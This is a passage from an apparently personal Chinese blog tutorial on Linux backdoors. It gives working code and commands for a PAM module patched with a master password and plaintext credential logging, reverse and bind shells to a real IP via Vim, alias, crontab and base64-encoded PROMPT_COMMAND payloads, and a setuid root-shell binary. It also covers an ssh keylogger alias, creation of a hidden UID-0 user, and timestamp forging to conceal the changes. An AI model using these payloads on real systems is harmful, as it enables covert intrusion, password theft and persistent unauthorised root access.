src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212352178.png" alt="image-20220821235259019"></p><h2 id="替换系统pam-unix-so文件"><a href="#替换系统pam-unix-so文件" class="headerlink" title="替换系统pam_unix.so文件"></a>替换系统pam_unix.so文件</h2><ul><li>查找系统pam_unix.so文件路径</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name pam_unix.so 2&gt;/dev/null</span><br><span class="line"><span class="comment">#/lib/x86 64-linux-gnu/security/pam unix.so</span></span><br></pre></td></tr></table></figure><ul><li>备份系统pam_unix.so文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">cp</span> /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so.bak</span><br></pre></td></tr></table></figure><ul><li>替换系统pam_unix.so文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /root/桌面/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">cp</span> /root/temppp/11111/pam-1.3.1/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so</span><br></pre></td></tr></table></figure><ul><li>查询是否执行成功</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $?</span><br><span class="line"><span class="comment">#用来返回上一条执行的结果！</span></span><br><span class="line"><span class="comment">#成功则返回0</span></span><br><span class="line"><span class="comment">#不成功则不是0的一个整数</span></span><br></pre></td></tr></table></figure><h2 id="修改时间戳"><a href="#修改时间戳" class="headerlink" title="修改时间戳"></a>修改时间戳</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> pam_unix.so -r pam_xauth.so</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311034561.png" alt="image-20220831103435233"></p><h2 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h2><p>复现成功~~~</p><p>密码为11pm，不影响原本root密码的登录。**使用了特定的密码绕过验证</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><blockquote><p>若不进行优化，则查看日志文件：&#x2F;var&#x2F;log&#x2F;auth.log，可以发现这种方式下的登录跟正常登录下的情况不一样。</p></blockquote><h4 id="正常日志："><a href="#正常日志：" class="headerlink" title="正常日志："></a>正常日志：</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311047601.png" alt="image-20220831104741410"></p><h4 id="非正常日志："><a href="#非正常日志：" class="headerlink" title="非正常日志："></a>非正常日志：</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311049953.png" alt="image-20220831104913751"></p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* verify the password of this user */</span></span><br><span class="line">        retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line"><span class="comment">//      if (strcmp(&quot;11pm&quot;,p)==0) &#123;return PAM_SUCCESS;&#125;</span></span><br><span class="line">        FILE * fp;</span><br><span class="line">        <span class="keyword">if</span> (retval == PAM_SUCCESS) &#123;</span><br><span class="line">          fp = fopen(<span class="string">&quot;/etc/pam.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">          <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s-&gt;%s\n&quot;</span>, name,p);</span><br><span class="line">          fclose(fp);</span><br><span class="line">        &#125;</span><br><span class="line">        name = p = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;support.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _unix_verify_password(<span class="type">pam_handle_t</span> * pamh, <span class="type">const</span> <span class="type">char</span> *name ,<span class="type">const</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">int</span> ctrl)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pwd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">char</span> *salt = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">char</span> *data_name;</span><br><span class="line">        <span class="type">int</span> retval;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;11pm&quot;</span>,p)==<span class="number">0</span>) &#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;</span><br><span class="line">        D((<span class="string">&quot;called&quot;</span>));</span><br></pre></td></tr></table></figure><p>然后编译生成so文件，替换系统pam_unix.so文件即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><a href="https://qiita.com/Y4er/items/e413dffdd8b1b7d0a59a">Linux-PAM后门</a></li><li><a href="https://www.cnblogs.com/-qing-/p/13178917.html"><strong>Linux Pam后门总结拓展</strong></a></li><li><a href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a></li></ul></blockquote><h1 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h1><p>前提条件：VIM安装了python扩展,默认安装的话都有python扩展，脚本可以放到python的扩展目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib/python2.7/site-packages &amp;&amp; $(<span class="built_in">nohup</span> vim -E -c <span class="string">&quot;pyfile s.py&quot;</span>&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; <span class="built_in">sleep</span> 2 &amp;&amp; <span class="built_in">rm</span> -f s.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#nohup将程序以忽略挂起信号的方式运行起来,即后台运行</span></span><br></pre></td></tr></table></figure><blockquote><p>s.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os, threading, sys, time</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">12345</span>))</span><br><span class="line">        server.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;waiting for connect&#x27;</span></span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;connect from&#x27;</span>,addr</span><br><span class="line">        proc = subprocess.Popen([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>], stdin=talk,stdout=talk,stderr=talk, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></blockquote><h1 id="Alias后门"><a href="#Alias后门" class="headerlink" title="Alias后门"></a>Alias后门</h1><blockquote><ul><li>通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。</li><li>需要注意的是！！！<strong>直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效。下面也有讲如何永久生效，alias用法里面</strong></li></ul></blockquote><h2 id="alias用法"><a href="#alias用法" class="headerlink" title="alias用法"></a>alias用法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入alias查看系统哪些别名 ，unalias删除别名，</span></span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="built_in">alias</span>(选项)(参数)</span><br><span class="line"><span class="comment">#选项</span></span><br><span class="line">-p：打印已经设置的命令别名。</span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line">命令别名设置：定义命令别名，格式为“命令别名=‘实际命令’”。</span><br><span class="line"><span class="comment">#实例</span></span><br><span class="line"><span class="built_in">alias</span> 的基本使用方法为：<span class="built_in">alias</span> 新的命令=<span class="string">&#x27;原命令 -选项/参数&#x27;</span></span><br><span class="line"><span class="comment">#命令别名永久生效</span></span><br><span class="line">直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效，如何才能永久有效呢？办法就是将别名的设置加入~/.bashrc文件，然后重新载入下文件就可以了。</span><br><span class="line">vim ~/.bashrc</span><br><span class="line">在文件最后面加入别名设置，如：<span class="built_in">alias</span> <span class="built_in">rm</span>=’<span class="built_in">rm</span> -i’，保存后重新载入：</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">这样就可以永久保存命令的别名了。因为修改的是当前用户目录下的.bashrc文件，所以这样的方式只对当前用户有用。如果要对所有用户都有效，修改/etc目录下的bashrc文件就可以了。在CentOS7下，这个文件是/etc/bash.bashrc。此外在CentOS7下，细看~/.bashrc文件，会发有这样一段代码：</span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_aliases ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">这个代码的意思就是加载.bash_aliases文件，CentOS7已经帮我们考虑好了，所以也可以在用户根目录下新建一个文件.bash_aliases存放命令别名设置。</span><br></pre></td></tr></table></figure><h2 id="SSH-Keylogger键盘记录（前面有讲）"><a href="#SSH-Keylogger键盘记录（前面有讲）" class="headerlink" title="SSH Keylogger键盘记录（前面有讲）"></a>SSH Keylogger键盘记录（前面有讲）</h2><p>修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译下面的c代码文件后，再shell下执行即可</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">cat</span>=<span class="string">&#x27;/root/.shell &amp;&amp; cat&#x27;</span></span><br><span class="line"><span class="comment">#控制机器：</span></span><br><span class="line">nc -lvvp 8008</span><br><span class="line"><span class="comment">#如果监听失败使用</span></span><br><span class="line">nc -lvnp 8008</span><br><span class="line"><span class="comment">#-n 直接使用IP地址，而不通过域名服务器</span></span><br></pre></td></tr></table></figure><blockquote><p>编译c代码生成shell可执行文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc shell.c -o .shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成的.shell可以隐藏在当前目录</span></span><br></pre></td></tr></table></figure><p>shell.c记得将IP换为自己监听机器的ip</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_EXIT(m) do&#123;perror(m); exit(EXIT_FAILURE);&#125;while (0);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">creat_daemon</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">time_t</span> t;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line">creat_daemon();</span><br><span class="line">system(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/124.223.217.243/8008 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="comment">//执行系统命令反弹shell</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creat_daemon</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> devnullfd,fd,fdtablesize;</span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>( pid == <span class="number">-1</span>)</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span> )</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line"><span class="keyword">if</span>(setsid() == <span class="number">-1</span>)</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;SETSID ERROR&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="comment">/* close any open file descriptors */</span></span><br><span class="line"><span class="keyword">for</span>(fd = <span class="number">0</span>, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++)</span><br><span class="line">  close(fd);</span><br><span class="line">devnullfd = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span></span><br><span class="line"><span class="keyword">if</span> (devnullfd == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t open /dev/null&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDIN_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDIN_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDOUT_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDERR_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGCHLD,SIG_IGN);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h1><blockquote><p>之前写过一片llinux计划任务的文章：<a href="https://11pmsleep.github.io/2022-09-24-%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">Linux-Crontab 计划任务</a></p></blockquote><blockquote><p>每分钟反弹一次shell给指定ip的8888端口</p></blockquote><h2 id="目标机器"><a href="#目标机器" class="headerlink" title="目标机器"></a>目标机器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/124.223.217.243/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;</span>)|crontab -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前计划任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="comment">#将标注输出通过管道符|写入计划任务</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/124.223.217.243/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;</span></span><br><span class="line"><span class="comment">#echo后门的内容就是反弹shell命令。</span></span><br><span class="line"><span class="comment">#exec 9&lt;&gt;/dev/tcp/124.223.217.243/6666;做的事情就是定义文件描述符9和将/dev/tcp/124.223.217.243/6666输入输出的重定向到自定义的标准文件描述符9中</span></span><br><span class="line"><span class="comment">#exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;做的事情就是将&amp;9接受的输入，重定向到标准输入；将标准错误输出重定向到标准输出，再将标准输出重定向到我们自己定义的文件描述符9之中输出</span></span><br><span class="line"><span class="comment">#/bin/bash --noprofile -i；做的事情就是，-i：实现脚本交互，--noprofile会跳过 Profile 脚本（系统环境的初始化，启动的初始化脚本)</span></span><br></pre></td></tr></table></figure><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><h1 id="Setuid-amp-Setgid提权后门"><a href="#Setuid-amp-Setgid提权后门" class="headerlink" title="Setuid &amp; Setgid提权后门"></a>Setuid &amp; Setgid提权后门</h1><p>当我们有机会拿到普通权限的时候，我们可以留下一个这样的后门程序，以后我们就可以直接提权拿到root的权限。</p><ul><li>setuid</li></ul><p><strong>设置使文件在执行阶段具有文件所有者的权限</strong>. 典型的文件是 &#x2F;usr&#x2F;bin&#x2F;passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码。</p><ul><li>setgid</li></ul><p>该权限只对目录有效. 目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组（即在相同组的话就具备相同的权限.</p><blockquote><p>back.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">gcc back.c -o back</span><br><span class="line"><span class="comment">#添加到bin目录，这样任何用户都能调用back</span></span><br><span class="line"><span class="built_in">cp</span> back /bin/</span><br><span class="line"><span class="comment">#赋予s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/back</span><br><span class="line">ll /bin/back</span><br><span class="line"><span class="comment">#通过后门back程序获取root权限</span></span><br><span class="line">back</span><br><span class="line">back <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h1 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Linux Bash Shell提供了一个环境变量：PROMPT_COMMAND，这个变量是在BASH<strong>出现提示符前</strong>执行的命令。即命令提示符</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看PROMPT_COMMAND到底是什么东西，</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $PROMPT_COMMAND</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\033]0;%s@%s:%s\007&quot;</span> <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;HOSTNAME%%.*&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;PWD/#$HOME/~&#125;</span>&quot;</span></span><br><span class="line"><span class="comment">#%s占位符，后门变量在此输出</span></span><br><span class="line"><span class="comment">#$&#123;USER&#125;、$&#123;HOSTNAME%%.*&#125;、$&#123;PWD/#$HOME/~&#125;都是变量</span></span><br><span class="line"><span class="comment">#最终输出的东西就是[root@localhost ~]#</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209041443989.png" alt="image-20220904144354523"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有环境变量</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line"><span class="comment">#查看特定变量(大小写严格)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PROMPT_COMMAND</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$USER</span></span><br><span class="line"><span class="comment">#关于path，就是我们系统调用的命令所在的目录，系统查找的时候就在path的目录下面一个个查找，知道成功调用，先查找/usr/local/sbin，其次/usr/local/bin，再次/usr/sbin，以此类推</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#输出：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span></span><br><span class="line"><span class="comment">#比如查看whoami在哪</span></span><br><span class="line">whereis <span class="built_in">whoami</span></span><br><span class="line"><span class="comment">#输出：whoami: /usr/bin/whoami /usr/share/man/man1/whoami.1.gz</span></span><br></pre></td></tr></table></figure><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="后门原理：-python学完后再来"><a href="#后门原理：-python学完后再来" class="headerlink" title="后门原理：(python学完后再来)"></a>后门原理：(python学完后再来)</h3><p>正是因为在执行命令之前都会先运行$PROMPT_COMMAND，所以我们不管执行什么命令都会触发这个变量。这就意味着我们将后门写在这个变量里面，就可以在不知不觉中获得后门</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#base64编码后的python脚本，注意更换ip为自己的ip</span></span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;124.223.217.243&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="comment">#base64编码后</span></span><br><span class="line">aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNC4yMjMuMjE3LjI0MyIsODA4MCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vc2giKQ==</span><br><span class="line"></span><br><span class="line"><span class="comment">#最终命令，通过export修改变量的属性，用于反弹shell</span></span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;lsof -i:8080 &amp;&gt;/dev/null || python -c &quot;</span><span class="built_in">exec</span>(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNC4yMjMuMjE3LjI0MyIsODA4MCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vc2giKQ==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="string">&quot; 2&gt;/dev/null &amp;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;lsof -i:8080 &amp;&gt;/dev/null || python -c &quot;</span><span class="built_in">exec</span>(<span class="built_in">ls</span>) 2&gt;/dev/null &amp;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#攻击机开启监听</span></span><br><span class="line"><span class="string">nc 124.223.217.243 1025</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正向shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#base64编码后的python脚本，本地监听1025端口</span></span><br><span class="line">import socket,os so=socket.socket(socket.AF_INET,socket.SOCK_STREAM) so.bind((<span class="string">&#x27;&#x27;</span>,1025)) so.listen(1) so,addr=so.accept() LJ=False <span class="keyword">while</span> not LJ: data=so.recv(1024) stdin,stdout,stderr,=os.popen3(data) stdout_value=stdout.read()+stderr.read() so.send(stdout_value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#最终命令，本地监听1025端口，用于正向连接，连接此端口</span></span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;</span><span class="built_in">exec</span>(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJycsMTAyNSkpCnNvLmxpc3RlbigxKQpzbyxhZGRyPXNvLmFjY2VwdCgpCkxKPUZhbHNlCndoaWxlIG5vdCBMSjoKCWRhdGE9c28ucmVjdigxMDI0KQoJc3RkaW4sc3Rkb3V0LHN0ZGVyciw9b3MucG9wZW4zKGRhdGEpCglzdGRvdXRfdmFsdWU9c3Rkb3V0LnJlYWQoKStzdGRlcnIucmVhZCgpCglzby5zZW5kKHN0ZG91dF92YWx1ZSkK&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="string">&quot; 2&gt;/dev/null &amp;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#被控机查看建立情况</span></span><br><span class="line">ps -elf|grep python</span><br><span class="line">netstat -anlp |grep 1025</span><br></pre></td></tr></table></figure><h2 id="记录历史操作"><a href="#记录历史操作" class="headerlink" title="记录历史操作"></a>记录历史操作</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=<span class="string">&#x27;msg=$(history 1|&#123; read x y; echo $y; &#125;);user=$(who am i);logger $(date &quot;+%Y-%m-%d%H:%M:%S&quot;):$user[$(whoami)]:`pwd`/:&quot;$msg&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过logger在系统日志中记录相应条目</span></span><br><span class="line"><span class="comment">#补充说明：logger命令 是用于往系统中写入日志，他提供一个shell命令接口到syslog系统模块</span></span><br><span class="line"><span class="comment">#语法：logger [options] [message]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#linux可以通过read赋值写入数据。如：</span></span><br><span class="line"><span class="built_in">read</span> x</span><br><span class="line">lalalala</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$x</span></span><br><span class="line"><span class="comment">#可以通过read来接受输入，再把输入传到对应的变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看执行的命令</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/messages</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209050027795.png" alt="image-20220905002731522"></p><h2 id="创建高权限用户"><a href="#创建高权限用户" class="headerlink" title="创建高权限用户"></a>创建高权限用户</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#useradd创建用户</span></span><br><span class="line"><span class="comment">#管理员的UID（用户ID）:GID（组ID）都是0，使用用户UID（用户ID）:GID（组ID）都是0，这样用户登录就具有了管理员权限</span></span><br><span class="line"><span class="comment">#直接修改passwd文件也是可以达到目的</span></span><br><span class="line">vim /etc/passwd</span><br><span class="line"><span 